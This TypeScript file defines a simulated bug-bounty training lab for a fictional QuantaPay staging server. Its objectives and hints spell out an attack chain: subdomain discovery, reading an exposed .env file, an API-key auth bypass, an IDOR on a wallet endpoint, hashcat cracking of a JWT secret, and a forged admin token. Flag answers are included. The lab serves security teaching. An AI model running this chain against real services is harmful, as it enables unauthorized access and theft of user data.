import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Bug Bounty module capstone: one continuous five-flag chain against a forgotten staging environment —
 *  subdomain discovery, an exposed .env leaking an API key, an auth-bypass, an IDOR, and a cracked JWT
 *  signing secret used to forge an admin token — the way a real bounty report reads (one asset, several
 *  chained findings), instead of five isolated single-bug reports. Every mechanic (dig, curl+vulnRoutes,
 *  hashcat) is already established elsewhere on this platform. */
export const bugBountyCapstoneLabs: LabScenario[] = [
  {
    id: 'bugbounty-capstone-staging-env-leak-to-admin-jwt-forgery',
    title: 'Capstone: A Forgotten Staging Subdomain Chains Into Admin Access',
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      'QuantaPay runs a public bug bounty program scoped to "*.quantapay.example". A quick DNS sweep turns ' +
      'up staging.quantapay.example — never mentioned in any documentation, never delinked from DNS after the ' +
      'team moved on, and still running a build with debug artifacts intact. From one exposed .env file, chain ' +
      'an API-key auth bypass, an IDOR on another user\'s wallet balance, and a cracked JWT signing secret all ' +
      'the way to a forged admin token — precisely the kind of multi-step chain that earns a critical-severity ' +
      'bounty instead of four separate low-severity ones.',
    objectives: [
      {
        text: 'dig staging.quantapay.example to confirm the forgotten subdomain resolves',
        why: 'A subdomain sweep against a bounty program\'s wildcard scope routinely turns up exactly this: infrastructure nobody remembered was still live.',
      },
      {
        text: 'curl 10.10.200.5/.env and capture the first flag',
        why: 'Staging builds frequently ship with debug/config endpoints the production build never exposes — an environment file with a live API key in it is one of the single most common real bug-bounty findings.',
      },
      {
        text: 'curl -H "X-Api-Key: <leaked-key>" http://10.10.200.5/v1/users/me and capture the second flag',
        why: 'Confirms the leaked key is a live, working credential against the real API — not just an unused artifact.',
      },
      {
        text: 'curl -H "X-Api-Key: <leaked-key>" "http://10.10.200.5/v1/users/wallet?user_id=8841" and capture the third flag',
        why: "The wallet endpoint trusts the caller's own user_id claim implicitly instead of checking it against the authenticated key's actual owner — a textbook IDOR reached this time through a leaked API key rather than a stolen session.",
      },
      {
        text: 'hashcat -m 16500 jwt-secret.hash wordlists/common-jwt-secrets.txt and capture the fourth flag',
        why: "A JWT captured during recon turns out to be signed with a short, common secret — entirely crackable offline, and once recovered, sufficient to forge any token with any claims at all.",
      },
      {
        text: 'curl -H "Authorization: Bearer forged.hs256.quantapay2024-signed-role-admin" http://10.10.200.5/v1/admin/export and capture the final flag',
        why: 'This is the actual chained impact: a forgotten staging subdomain, followed four steps, ends in a fully forged admin token pulling the entire user export — the difference between a $100 informational finding and a critical one.',
      },
    ],
    hints: [
      'dig staging.quantapay.example',
      'curl 10.10.200.5/.env',
      'curl -H "X-Api-Key: qp_stg_7f3a9c2e1b" http://10.10.200.5/v1/users/me',
      'curl -H "X-Api-Key: qp_stg_7f3a9c2e1b" "http://10.10.200.5/v1/users/wallet?user_id=8841"',
      'cat captured-jwt-info.txt',
      'hashcat -m 16500 jwt-secret.hash wordlists/common-jwt-secrets.txt',
      'curl -H "Authorization: Bearer forged.hs256.quantapay2024-signed-role-admin" http://10.10.200.5/v1/admin/export',
    ],
    totalFlags: 5,
    attacker: attacker({
      'captured-jwt-info.txt': file(
        'Intercepted Authorization header from a normal staging login request:\n' +
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.7q2xPa...\n' +
          'Algorithm: HS256 — same secret both signs and verifies every token this service issues.\n',
      ),
      'jwt-secret.hash': file(
        '#HASHCAT_HASH:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.7q2xPa\n' +
          '#HASHCAT_PLAINTEXT:quantapay2024\n' +
          '#HASHCAT_FLAG:flag{jwt_signing_secret_cracked_via_offline_wordlist_attack}\n',
      ),
      wordlists: dir({ 'common-jwt-secrets.txt': file('secret\nchangeme\njwtsecret\nquantapay2024\nsupersecret\npassword123\n') }),
    }),
    network: [
      {
        hostname: 'staging.quantapay.example',
        ip: '10.10.200.5',
        os: 'Ubuntu 22.04 (staging build, debug artifacts intact)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 + Node.js API gateway (staging build)',
            http: {
              '/.env': 'NODE_ENV=staging\nDB_HOST=internal-staging-db\nQUANTAPAY_API_KEY=qp_stg_7f3a9c2e1b\n# never meant to ship — flag{exposed_env_file_leaks_live_staging_api_key}\n',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/v1/users/me',
                param: 'X-Api-Key',
                location: 'header',
                triggerSubstrings: ['qp_stg_7f3a9c2e1b'],
                vulnerableResponse: '{"user_id":90211,"email":"staging-tester@quantapay.example","flag":"flag{leaked_env_api_key_authenticates_against_live_api}"}',
                normalResponse: '{"error":"401 unauthorized"}',
              },
              {
                kind: 'idor',
                path: '/v1/users/wallet',
                param: 'user_id',
                triggerSubstrings: ['8841'],
                vulnerableResponse: '{"user_id":8841,"owner":"R. Delgado","balance_usd":48210.55,"flag":"flag{wallet_endpoint_idor_via_leaked_api_key}"}',
                normalResponse: '{"error":"wallet not found for this key\'s owner"}',
              },
              {
                kind: 'auth-bypass',
                path: '/v1/admin/export',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['quantapay2024-signed-role-admin'],
                vulnerableResponse: '{"status":"export_complete","users":214880,"flag":"flag{forged_admin_jwt_full_user_export_chained_from_env_leak}"}',
                normalResponse: '{"error":"403 forbidden — invalid signature or insufficient role"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
